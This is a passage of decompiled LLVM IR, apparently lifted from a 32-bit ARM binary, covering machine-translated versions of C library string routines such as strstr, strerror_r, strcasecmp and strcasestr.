  %v2_11adc = load i32, i32* %v1_11adc, align 4
  %v4_11adc = add i32 %v0_11aa439, 4
  store i32 %v4_11adc, i32* @lr, align 4
  %v2_11ae0 = add i32 %v2_11adc, -16843009
  %v2_11ae4 = and i32 %v2_11ae0, -2139062144
  %v2_11ae8 = icmp eq i32 %v2_11ae4, 0
  br i1 %v2_11ae8, label %dec_label_pc_11b30, label %dec_label_pc_11af0

dec_label_pc_11af0:                               ; preds = %dec_label_pc_11adc
  %v2_11af0 = inttoptr i32 %v0_11aa439 to i8*
  %v3_11af0 = load i8, i8* %v2_11af0, align 1
  %v2_11af8 = icmp eq i8 %v3_11af0, 0
  %v1_11afc = add i32 %v0_11aa439, 1
  br i1 %v2_11af8, label %dec_label_pc_11aa4, label %dec_label_pc_11b04

dec_label_pc_11b04:                               ; preds = %dec_label_pc_11af0
  %v2_11b04 = inttoptr i32 %v1_11afc to i8*
  %v3_11b04 = load i8, i8* %v2_11b04, align 1
  %v2_11b08 = icmp eq i8 %v3_11b04, 0
  br i1 %v2_11b08, label %dec_label_pc_11b44, label %dec_label_pc_11b10

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11b04
  %v1_11b10 = add i32 %v0_11aa439, 2
  %v2_11b10 = inttoptr i32 %v1_11b10 to i8*
  %v3_11b10 = load i8, i8* %v2_11b10, align 1
  %v2_11b14 = icmp eq i8 %v3_11b10, 0
  br i1 %v2_11b14, label %dec_label_pc_11b44, label %dec_label_pc_11b20

dec_label_pc_11b20:                               ; preds = %dec_label_pc_11b10
  %v1_11b20 = add i32 %v0_11aa439, 3
  %v2_11b20 = inttoptr i32 %v1_11b20 to i8*
  %v3_11b20 = load i8, i8* %v2_11b20, align 1
  %v2_11b24 = icmp eq i8 %v3_11b20, 0
  br i1 %v2_11b24, label %dec_label_pc_11b44, label %dec_label_pc_11b30

dec_label_pc_11b30:                               ; preds = %dec_label_pc_11b20, %dec_label_pc_11adc
  %v3_11b34 = icmp ult i32 %v4_11adc, %v5_11b48
  br i1 %v3_11b34, label %dec_label_pc_11adc, label %dec_label_pc_11b44

dec_label_pc_11b44:                               ; preds = %dec_label_pc_11b30, %dec_label_pc_11ad4, %dec_label_pc_11b04, %dec_label_pc_11b10, %dec_label_pc_11b20, %dec_label_pc_11aa4
  %v1_11b44 = phi i32 [ %v0_11aa439, %dec_label_pc_11aa4 ], [ %storemerge.lcssa, %dec_label_pc_11ad4 ], [ %v1_11afc, %dec_label_pc_11b04 ], [ %v1_11b10, %dec_label_pc_11b10 ], [ %v1_11b20, %dec_label_pc_11b20 ], [ %v5_11b48, %dec_label_pc_11b30 ]
  %v3_11b44 = icmp uge i32 %v5_11b48, %v1_11b44
  %v9_11b44 = icmp eq i32 %v5_11b48, %v1_11b44
  %v2_11b48 = xor i1 %v3_11b44, true
  %v3_11b48 = or i1 %v9_11b44, %v2_11b48
  br i1 %v3_11b48, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_11b44
  %v6_11b48 = sub i32 %v5_11b48, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_11b44, %bb25
  %v5_11b4c = phi i32 [ %v1_11b44, %dec_label_pc_11b44 ], [ %v6_11b48, %bb25 ]
  %v2_11b4c = xor i1 %v9_11b44, true
  %v3_11b4c = and i1 %v3_11b44, %v2_11b4c
  br i1 %v3_11b4c, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_11b4c = sub i32 %v5_11b4c, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_11b50 = phi i32 [ %v5_11b4c, %bb26 ], [ %v6_11b4c, %bb27 ]
  ret i32 %v8_11b50

; uselistorder directives
  uselistorder i1 %v3_11b44, { 1, 0 }
  uselistorder i32 %v4_11adc, { 1, 2, 0 }
  uselistorder i32 %v0_11aa439, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_11ac8, { 1, 0, 2 }
  uselistorder i32 %v1_11a94, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_11b48, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_11a94, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_11b44, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_11abc, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %v6_11b5c = load i32, i32* @r5, align 4
  %v9_11b5c = load i32, i32* @r6, align 4
  %v3_11b60 = load i8, i8* %arg2, align 1
  %v2_11b64 = icmp eq i8 %v3_11b60, 0
  br i1 %v2_11b64, label %bb, label %bb50

bb:                                               ; preds = %entry
  ret i32 %arg1

bb50:                                             ; preds = %entry
  %v1_11b6c = add i32 %arg1, -1
  br label %dec_label_pc_11b70

dec_label_pc_11b70:                               ; preds = %dec_label_pc_11b7c, %bb50
  %v0_11b70 = phi i32 [ %v1_11b70, %dec_label_pc_11b7c ], [ %v1_11b6c, %bb50 ]
  %v1_11b70 = add i32 %v0_11b70, 1
  %v2_11b70 = inttoptr i32 %v1_11b70 to i8*
  %v3_11b70 = load i8, i8* %v2_11b70, align 1
  %v2_11b74 = icmp eq i8 %v3_11b70, 0
  br i1 %v2_11b74, label %dec_label_pc_11c4c, label %dec_label_pc_11b7c

dec_label_pc_11b7c:                               ; preds = %dec_label_pc_11b70
  %v9_11b7c = icmp eq i8 %v3_11b70, %v3_11b60
  br i1 %v9_11b7c, label %dec_label_pc_11b84, label %dec_label_pc_11b70

dec_label_pc_11b84:                               ; preds = %dec_label_pc_11b7c
  %v2_11b84 = add i32 %tmp, 1
  %v3_11b84 = inttoptr i32 %v2_11b84 to i8*
  %v4_11b84 = load i8, i8* %v3_11b84, align 1
  %v2_11b88 = icmp eq i8 %v4_11b84, 0
  br i1 %v2_11b88, label %bb51, label %bb52

bb51:                                             ; preds = %dec_label_pc_11b84
  store i32 %v6_11b5c, i32* @r5, align 4
  store i32 %v9_11b5c, i32* @r6, align 4
  ret i32 %v1_11b70

bb52:                                             ; preds = %dec_label_pc_11b84
  %v1_11b94 = add i32 %v0_11b70, 2
  %v1_11be8 = add i32 %tmp, 2
  %v2_11be8 = inttoptr i32 %v1_11be8 to i8*
  br label %dec_label_pc_11be0

dec_label_pc_11ba4:                               ; preds = %dec_label_pc_11c40
  %v3_11ba4 = load i8, i8* %v3_11bd8.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  br label %dec_label_pc_11bd0.preheader

dec_label_pc_11bd0.preheader:                     ; preds = %dec_label_pc_11ba4, %dec_label_pc_11be0
  %v0_11bd04.in = phi i8 [ %v3_11ba4, %dec_label_pc_11ba4 ], [ %v3_11bd8.pn, %dec_label_pc_11be0 ]
  %v9_11bd013 = icmp eq i8 %v0_11bd04.in, %v3_11b60
  br i1 %v9_11bd013, label %dec_label_pc_11bd8, label %dec_label_pc_11bb0

dec_label_pc_11bb0:                               ; preds = %dec_label_pc_11bd0.preheader, %dec_label_pc_11bcc
  %v0_11bb8 = phi i32 [ %v1_11bcc, %dec_label_pc_11bcc ], [ %storemerge43, %dec_label_pc_11bd0.preheader ]
  %v0_11bb0.in = phi i8 [ %v3_11bcc, %dec_label_pc_11bcc ], [ %v0_11bd04.in, %dec_label_pc_11bd0.preheader ]
  %v2_11bb0 = icmp eq i8 %v0_11bb0.in, 0
  br i1 %v2_11bb0, label %dec_label_pc_11c4c, label %dec_label_pc_11bb8

dec_label_pc_11bb8:                               ; preds = %dec_label_pc_11bb0
  %v1_11bb8 = add i32 %v0_11bb8, 1
  %v2_11bb8 = inttoptr i32 %v1_11bb8 to i8*
  %v3_11bb8 = load i8, i8* %v2_11bb8, align 1
  store i32 %v1_11bb8, i32* @ip, align 4
  %v9_11bbc = icmp eq i8 %v3_11bb8, %v3_11b60
  br i1 %v9_11bbc, label %dec_label_pc_11bd8, label %dec_label_pc_11bc4

dec_label_pc_11bc4:                               ; preds = %dec_label_pc_11bb8
  %v2_11bc4 = icmp eq i8 %v3_11bb8, 0
  br i1 %v2_11bc4, label %dec_label_pc_11c4c, label %dec_label_pc_11bcc

dec_label_pc_11bcc:                               ; preds = %dec_label_pc_11bc4
  %v1_11bcc = add i32 %v0_11bb8, 2
  %v2_11bcc = inttoptr i32 %v1_11bcc to i8*
  %v3_11bcc = load i8, i8* %v2_11bcc, align 1
  store i32 %v1_11bcc, i32* @ip, align 4
  %v9_11bd0 = icmp eq i8 %v3_11bcc, %v3_11b60
  br i1 %v9_11bd0, label %dec_label_pc_11bd8, label %dec_label_pc_11bb0

dec_label_pc_11bd8:                               ; preds = %dec_label_pc_11bb8, %dec_label_pc_11bcc, %dec_label_pc_11bd0.preheader
  %v0_11bd8 = phi i32 [ %storemerge43, %dec_label_pc_11bd0.preheader ], [ %v1_11bb8, %dec_label_pc_11bb8 ], [ %v1_11bcc, %dec_label_pc_11bcc ]
  %v1_11bd8 = add i32 %v0_11bd8, 1
  br label %dec_label_pc_11be0

dec_label_pc_11be0:                               ; preds = %bb52, %dec_label_pc_11bd8
  %storemerge43 = phi i32 [ %v1_11bd8, %dec_label_pc_11bd8 ], [ %v1_11b94, %bb52 ]
  %v3_11bd8.pn.in = inttoptr i32 %storemerge43 to i8*
  %v3_11bd8.pn = load i8, i8* %v3_11bd8.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  %storemerge = icmp eq i8 %v3_11bd8.pn, %v4_11b84
  br i1 %storemerge, label %dec_label_pc_11be4, label %dec_label_pc_11bd0.preheader

dec_label_pc_11be4:                               ; preds = %dec_label_pc_11be0
  %v1_11be4 = add i32 %storemerge43, 1
  %v2_11be4 = inttoptr i32 %v1_11be4 to i8*
  %v3_11be4 = load i8, i8* %v2_11be4, align 1
  %v4_11be4 = zext i8 %v3_11be4 to i32
  %v3_11be8 = load i8, i8* %v2_11be8, align 1
  %v4_11be8 = zext i8 %v3_11be8 to i32
  %v1_11bec = add i32 %storemerge43, -1
  %v9_11bf0 = icmp eq i8 %v3_11be4, %v3_11be8
  store i32 %v1_11be8, i32* @lr, align 4
  store i32 %v1_11be4, i32* @ip, align 4
  br i1 %v9_11bf0, label %dec_label_pc_11c00, label %dec_label_pc_11c40

dec_label_pc_11c00:                               ; preds = %dec_label_pc_11be4, %dec_label_pc_11bfc
  %v0_11c18 = phi i32 [ %v1_11c20, %dec_label_pc_11bfc ], [ %v1_11be8, %dec_label_pc_11be4 ]
  %v0_11c10 = phi i32 [ %v1_11c1c, %dec_label_pc_11bfc ], [ %v1_11be4, %dec_label_pc_11be4 ]
  %v0_11c00 = phi i32 [ %v4_11c30, %dec_label_pc_11bfc ], [ %v4_11be4, %dec_label_pc_11be4 ]
  %v2_11c00 = icmp eq i32 %v0_11c00, 0
  br i1 %v2_11c00, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_11c00
  store i32 %v6_11b5c, i32* @r5, align 4
  store i32 %v9_11b5c, i32* @r6, align 4
  ret i32 %v1_11bec

bb54:                                             ; preds = %dec_label_pc_11c00
  %v1_11c08 = add i32 %v0_11c10, 1
  %v2_11c08 = inttoptr i32 %v1_11c08 to i8*
  %v3_11c08 = load i8, i8* %v2_11c08, align 1
  %v1_11c0c = add i32 %v0_11c18, 1
  %v2_11c0c = inttoptr i32 %v1_11c0c to i8*
  %v3_11c0c = load i8, i8* %v2_11c0c, align 1
  %v4_11c0c = zext i8 %v3_11c0c to i32
  store i32 %v1_11c08, i32* @r1, align 4
  %v9_11c14 = icmp eq i8 %v3_11c08, %v3_11c0c
  %v1_11c1c = add i32 %v0_11c10, 2
  store i32 %v1_11c1c, i32* @ip, align 4
  %v1_11c20 = add i32 %v0_11c18, 2
  store i32 %v1_11c20, i32* @lr, align 4
  br i1 %v9_11c14, label %dec_label_pc_11c28, label %dec_label_pc_11c40

dec_label_pc_11c28:                               ; preds = %bb54
  %v2_11c28 = icmp eq i8 %v3_11c08, 0
  br i1 %v2_11c28, label %bb55, label %dec_label_pc_11bfc

bb55:                                             ; preds = %dec_label_pc_11c28
  store i32 %v6_11b5c, i32* @r5, align 4
  store i32 %v9_11b5c, i32* @r6, align 4
  ret i32 %v1_11bec

dec_label_pc_11bfc:                               ; preds = %dec_label_pc_11c28
  %v2_11c30 = inttoptr i32 %v1_11c20 to i8*
  %v3_11c30 = load i8, i8* %v2_11c30, align 1
  %v4_11c30 = zext i8 %v3_11c30 to i32
  %v2_11c34 = inttoptr i32 %v1_11c1c to i8*
  %v3_11c34 = load i8, i8* %v2_11c34, align 1
  %v9_11c38 = icmp eq i8 %v3_11c34, %v3_11c30
  br i1 %v9_11c38, label %dec_label_pc_11c00, label %dec_label_pc_11c40

dec_label_pc_11c40:                               ; preds = %dec_label_pc_11bfc, %bb54, %dec_label_pc_11be4
  %v0_11c40 = phi i32 [ %v4_11be8, %dec_label_pc_11be4 ], [ %v4_11c30, %dec_label_pc_11bfc ], [ %v4_11c0c, %bb54 ]
  %v2_11c40 = icmp eq i32 %v0_11c40, 0
  br i1 %v2_11c40, label %dec_label_pc_11c48, label %dec_label_pc_11ba4

dec_label_pc_11c48:                               ; preds = %dec_label_pc_11c40
  store i32 %v6_11b5c, i32* @r5, align 4
  store i32 %v9_11b5c, i32* @r6, align 4
  ret i32 %v1_11bec

dec_label_pc_11c4c:                               ; preds = %dec_label_pc_11b70, %dec_label_pc_11bc4, %dec_label_pc_11bb0
  store i32 %v6_11b5c, i32* @r5, align 4
  store i32 %v9_11b5c, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11c20, { 0, 2, 1 }
  uselistorder i32 %v1_11c1c, { 1, 2, 0 }
  uselistorder i32 %v1_11bec, { 2, 1, 0 }
  uselistorder i8 %v3_11bd8.pn, { 1, 0 }
  uselistorder i8* %v3_11bd8.pn.in, { 1, 0 }
  uselistorder i32 %storemerge43, { 4, 2, 6, 1, 3, 0, 5 }
  uselistorder i8 %v3_11bcc, { 1, 0 }
  uselistorder i32 %v1_11bcc, { 0, 2, 3, 1 }
  uselistorder i32 %v1_11b70, { 0, 2, 1 }
  uselistorder i8 %v3_11b60, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_11b5c, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v6_11b5c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_11c4c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11c00, { 1, 0 }
  uselistorder label %dec_label_pc_11be0, { 1, 0 }
  uselistorder label %dec_label_pc_11bd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11bb0, { 1, 0 }
  uselistorder label %dec_label_pc_11bd0.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11c5c = call i32 @__xpg_strerror_r()
  %v0_11c60 = load i32, i32* @r4, align 4
  ret i32 %v0_11c60
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_11c68 = load i32, i32* @r4, align 4
  %v0_11c6c = load i32, i32* @r0, align 4
  %v0_11c78 = load i32, i32* @r1, align 4
  store i32 %v0_11c78, i32* @r8, align 4
  %v0_11c7c = load i32, i32* @r2, align 4
  store i32 %v0_11c7c, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_11c6c, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_11cb4

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1a15c.699 to i32), i32* @r5, align 4
  %v2_11c9c3446 = icmp eq i32 %v0_11c6c, 0
  br i1 %v2_11c9c3446, label %bb26, label %dec_label_pc_11c90.lr.ph

dec_label_pc_11c90:                               ; preds = %dec_label_pc_11c90.lr.ph, %bb
  %v2_11ca841 = phi i1 [ %v2_11ca83849, %dec_label_pc_11c90.lr.ph ], [ %v2_11ca8, %bb ]
  %v1_11cac40 = phi i32 [ %v0_11c9c.pr48, %dec_label_pc_11c90.lr.ph ], [ %v2_11c98, %bb ]
  %v0_11c9439 = phi i32 [ %v0_11ca0547, %dec_label_pc_11c90.lr.ph ], [ %v1_11c94, %bb ]
  %v1_11c94 = add i32 %v0_11c9439, 1
  store i32 %v1_11c94, i32* @r5, align 4
  br i1 %v2_11ca841, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_11c90
  %v2_11c98 = add i32 %v1_11cac40, -1
  %v2_11c9c = icmp eq i32 %v2_11c98, 0
  %v1_11ca0 = inttoptr i32 %v1_11c94 to i8*
  %v2_11ca0 = load i8, i8* %v1_11ca0, align 1
  %v2_11ca8 = icmp eq i8 %v2_11ca0, 0
  br i1 %v2_11c9c, label %dec_label_pc_11ca8, label %dec_label_pc_11c90

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_11c90
  %v1_11ca035 = inttoptr i32 %v1_11c94 to i8*
  %v2_11ca036 = load i8, i8* %v1_11ca035, align 1
  %v2_11ca838 = icmp eq i8 %v2_11ca036, 0
  br label %dec_label_pc_11c90.lr.ph

dec_label_pc_11c90.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_11ca83849 = phi i1 [ %v2_11ca838, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_11c9c.pr48 = phi i32 [ %v1_11cac40, %thread-pre-split.loopexit ], [ %v0_11c6c, %thread-pre-split.preheader ]
  %v0_11ca0547 = phi i32 [ %v1_11c94, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_1a15c.699 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_11c90

dec_label_pc_11ca8:                               ; preds = %bb
  br i1 %v2_11ca8, label %dec_label_pc_11cb4, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_11ca8
  %v0_11c94.lcssa55 = phi i32 [ %v1_11c94, %dec_label_pc_11ca8 ], [ ptrtoint ([8 x i8]* @global_var_1a15c.699 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11ce8

dec_label_pc_11cb4:                               ; preds = %dec_label_pc_11ca8, %entry
  %v3_11cb8 = ashr i32 %v0_11c6c, 31
  %v5_11ccc = bitcast i32* %stack_var_-25 to i8*
  %v6_11ccc = call i32 @_uintmaxtostr(i8* %v5_11ccc, i32 %v0_11c6c, i32 %v3_11cb8, i32 -10, i32 0)
  %v1_11cd0 = add i32 %v6_11ccc, -14
  store i32 %v1_11cd0, i32* @r5, align 4
  store i32 %v1_11cd0, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1a14c.701 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_11ce0 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_11ce8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11ce8

dec_label_pc_11ce8:                               ; preds = %bb26, %dec_label_pc_11cb4
  %v0_11ce8 = phi i32 [ %v0_11c94.lcssa55, %bb26 ], [ %v0_11ce8.pre, %dec_label_pc_11cb4 ]
  %v1_11ce8 = inttoptr i32 %v0_11ce8 to i8*
  %v3_11cec = call i32 @strlen(i8* %v1_11ce8)
  %v0_11cf0 = load i32, i32* @r8, align 4
  %v2_11cf0 = icmp eq i32 %v0_11cf0, 0
  %v1_11cf4 = add i32 %v3_11cec, 1
  store i32 %v1_11cf4, i32* @r4, align 4
  br i1 %v2_11cf0, label %bb27, label %dec_label_pc_11ce8._crit_edge

dec_label_pc_11ce8._crit_edge:                    ; preds = %dec_label_pc_11ce8
  %v1_11cfc.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_11ce8
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_11ce8._crit_edge, %bb27
  %v4_11d00 = phi i32 [ %v1_11cfc.pre, %dec_label_pc_11ce8._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_11cf4, %v4_11d00
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_11d00, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_11d1014 = phi i32 [ %v4_11d00, %bb29 ], [ %v1_11cf4, %bb28 ]
  %v2_11d08 = icmp eq i32 %v0_11d1014, 0
  br i1 %v2_11d08, label %dec_label_pc_11d2c, label %dec_label_pc_11d10

dec_label_pc_11d10:                               ; preds = %.thread16
  store i32 %v0_11d1014, i32* @r2, align 4
  %v0_11d14 = load i32, i32* @r5, align 4
  store i32 %v0_11d14, i32* @r1, align 4
  store i32 %v0_11cf0, i32* @r0, align 4
  %v0_11d1c = call i32 @memcpy()
  %v0_11d20 = load i32, i32* @r8, align 4
  %v1_11d20 = load i32, i32* @r4, align 4
  %v2_11d20 = add i32 %v1_11d20, %v0_11d20
  %v3_11d28 = add i32 %v2_11d20, -1
  %v4_11d28 = inttoptr i32 %v3_11d28 to i8*
  store i8 0, i8* %v4_11d28, align 1
  br label %dec_label_pc_11d2c

dec_label_pc_11d2c:                               ; preds = %.thread16, %dec_label_pc_11d10
  %v0_11d2c = load i32, i32* %r7.global-to-local, align 4
  %v2_11d2c = icmp eq i32 %v0_11d2c, 0
  br i1 %v2_11d2c, label %dec_label_pc_11d3c, label %dec_label_pc_11d34

dec_label_pc_11d34:                               ; preds = %dec_label_pc_11d2c
  %v0_11d34 = call i32 @__errno_location()
  %v0_11d38 = load i32, i32* %r7.global-to-local, align 4
  %v2_11d38 = inttoptr i32 %v0_11d34 to i32*
  store i32 %v0_11d38, i32* %v2_11d38, align 4
  %v0_11d3c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11d3c

dec_label_pc_11d3c:                               ; preds = %dec_label_pc_11d2c, %dec_label_pc_11d34
  %v0_11d3c = phi i32 [ 0, %dec_label_pc_11d2c ], [ %v0_11d3c.pre, %dec_label_pc_11d34 ]
  store i32 %v3_11c68, i32* @r4, align 4
  ret i32 %v0_11d3c

; uselistorder directives
  uselistorder i32 %v4_11d00, { 1, 2, 0 }
  uselistorder i32 %v1_11cf4, { 1, 0, 2 }
  uselistorder i32 %v1_11c94, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_11c6c, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 3, 0, 1, 5 }
  uselistorder label %dec_label_pc_11d3c, { 1, 0 }
  uselistorder label %dec_label_pc_11d2c, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_11ce8, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_11d60

dec_label_pc_11d60:                               ; preds = %bb8, %entry
  %v8_11dc43 = phi i32 [ %v8_11dc4, %bb8 ], [ 0, %entry ]
  %v0_11db8 = phi i32 [ %v1_11db8, %bb8 ], [ %arg2, %entry ]
  %v0_11dbc = phi i32 [ %v1_11dbc, %bb8 ], [ %tmp, %entry ]
  %v9_11d60 = icmp eq i32 %v0_11dbc, %v0_11db8
  br i1 %v9_11d60, label %dec_label_pc_11d60._crit_edge, label %dec_label_pc_11d68

dec_label_pc_11d60._crit_edge:                    ; preds = %dec_label_pc_11d60
  %.pre = inttoptr i32 %v0_11db8 to i8*
  br label %bb8

dec_label_pc_11d68:                               ; preds = %dec_label_pc_11d60
  %v1_11d6c = inttoptr i32 %v0_11dbc to i8*
  %v2_11d6c = load i8, i8* %v1_11d6c, align 1
  %v3_11d6c = zext i8 %v2_11d6c to i32
  %v1_11d70 = inttoptr i32 %v0_11db8 to i8*
  %v2_11d70 = load i8, i8* %v1_11d70, align 1
  %v3_11d70 = zext i8 %v2_11d70 to i32
  %v2_11d74 = load i32, i32* bitcast (i32** @global_var_23ae8.704 to i32*), align 4
  %v2_11d78 = mul nuw nsw i32 %v3_11d6c, 2
  store i32 %v2_11d78, i32* @ip, align 4
  %v2_11d7c = mul nuw nsw i32 %v3_11d70, 2
  %v2_11d80 = add i32 %v2_11d7c, %v2_11d74
  %v2_11d84 = add i32 %v2_11d74, %v2_11d78
  %v1_11d88 = add i32 %v2_11d84, 1
  %v2_11d88 = inttoptr i32 %v1_11d88 to i8*
  %v3_11d88 = load i8, i8* %v2_11d88, align 1
  %v4_11d88 = zext i8 %v3_11d88 to i32
  %v1_11d8c = add i32 %v2_11d80, 1
  %v2_11d8c = inttoptr i32 %v1_11d8c to i8*
  %v3_11d8c = load i8, i8* %v2_11d8c, align 1
  %v4_11d8c = zext i8 %v3_11d8c to i32
  %v3_11d90 = inttoptr i32 %v2_11d80 to i8*
  %v4_11d90 = load i8, i8* %v3_11d90, align 1
  %v6_11d90 = zext i8 %v4_11d90 to i32
  %v3_11d94 = inttoptr i32 %v2_11d84 to i8*
  %v4_11d94 = load i8, i8* %v3_11d94, align 1
  %v6_11d94 = zext i8 %v4_11d94 to i32
  %v3_11d98 = mul nuw i32 %v4_11d8c, 16777216
  %v3_11d9c = mul nuw i32 %v4_11d88, 16777216
  %v4_11da0 = sdiv i32 %v3_11d9c, 65536
  %v5_11da0 = or i32 %v6_11d94, %v4_11da0
  %v4_11da4 = sdiv i32 %v3_11d98, 65536
  %v5_11da4 = or i32 %v4_11da4, %v6_11d90
  %v2_11da8 = sub nsw i32 %v5_11da0, %v5_11da4
  %v9_11da8 = icmp eq i32 %v5_11da0, %v5_11da4
  br i1 %v9_11da8, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_11d68
  ret i32 %v2_11da8

bb8:                                              ; preds = %dec_label_pc_11d60._crit_edge, %dec_label_pc_11d68
  %v1_11db0.pre-phi = phi i8* [ %.pre, %dec_label_pc_11d60._crit_edge ], [ %v1_11d6c, %dec_label_pc_11d68 ]
  %v8_11dc4 = phi i32 [ %v8_11dc43, %dec_label_pc_11d60._crit_edge ], [ %v2_11da8, %dec_label_pc_11d68 ]
  %v2_11db0 = load i8, i8* %v1_11db0.pre-phi, align 1
  %v2_11db4 = icmp eq i8 %v2_11db0, 0
  %v1_11db8 = add i32 %v0_11db8, 1
  %v1_11dbc = add i32 %v0_11dbc, 1
  store i32 %v1_11dbc, i32* @lr, align 4
  br i1 %v2_11db4, label %dec_label_pc_11dc4, label %dec_label_pc_11d60

dec_label_pc_11dc4:                               ; preds = %bb8
  ret i32 %v8_11dc4

; uselistorder directives
  uselistorder i32 %v1_11dbc, { 1, 0 }
  uselistorder i32 %v2_11da8, { 1, 0 }
  uselistorder i32 %v5_11da4, { 1, 0 }
  uselistorder i32 %v5_11da0, { 1, 0 }
  uselistorder i32 %v2_11d78, { 1, 0 }
  uselistorder i32 %v0_11db8, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_11de016 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_11de0.outer

dec_label_pc_11de0.outer:                         ; preds = %dec_label_pc_11e48, %entry
  %v0_11df4.ph = phi i32 [ %v1_11e48, %dec_label_pc_11e48 ], [ %tmp, %entry ]
  %v2_11de017 = load i8, i8* %v1_11de016, align 1
  %v2_11de419 = icmp eq i8 %v2_11de017, 0
  br i1 %v2_11de419, label %dec_label_pc_11df4, label %dec_label_pc_11dfc

dec_label_pc_11df4:                               ; preds = %dec_label_pc_11de0.backedge, %dec_label_pc_11de0.outer
  ret i32 %v0_11df4.ph

dec_label_pc_11dfc:                               ; preds = %dec_label_pc_11de0.outer, %dec_label_pc_11de0.backedge
  %v1_11dec25.in = phi i32 [ %v1_11dec25, %dec_label_pc_11de0.backedge ], [ %arg2, %dec_label_pc_11de0.outer ]
  %v2_11de023 = phi i8 [ %v2_11de0, %dec_label_pc_11de0.backedge ], [ %v2_11de017, %dec_label_pc_11de0.outer ]
  %v2_11de824.in.in = phi i8 [ %v2_11de0, %dec_label_pc_11de0.backedge ], [ %v2_11de017, %dec_label_pc_11de0.outer ]
  %v0_11e0422 = phi i32 [ %v1_11e04, %dec_label_pc_11de0.backedge ], [ %v0_11df4.ph, %dec_label_pc_11de0.outer ]
  %v1_11dec25 = add i32 %v1_11dec25.in, 1
  %v1_11dfc = inttoptr i32 %v0_11e0422 to i8*
  %v2_11dfc = load i8, i8* %v1_11dfc, align 1
  %v9_11e00 = icmp eq i8 %v2_11de023, %v2_11dfc
  %v1_11e04 = add i32 %v0_11e0422, 1
  br i1 %v9_11e00, label %dec_label_pc_11de0.backedge, label %dec_label_pc_11e10

dec_label_pc_11de0.backedge:                      ; preds = %dec_label_pc_11dfc, %dec_label_pc_11e10
  %v1_11de0 = inttoptr i32 %v1_11dec25 to i8*
  %v2_11de0 = load i8, i8* %v1_11de0, align 1
  %v2_11de4 = icmp eq i8 %v2_11de0, 0
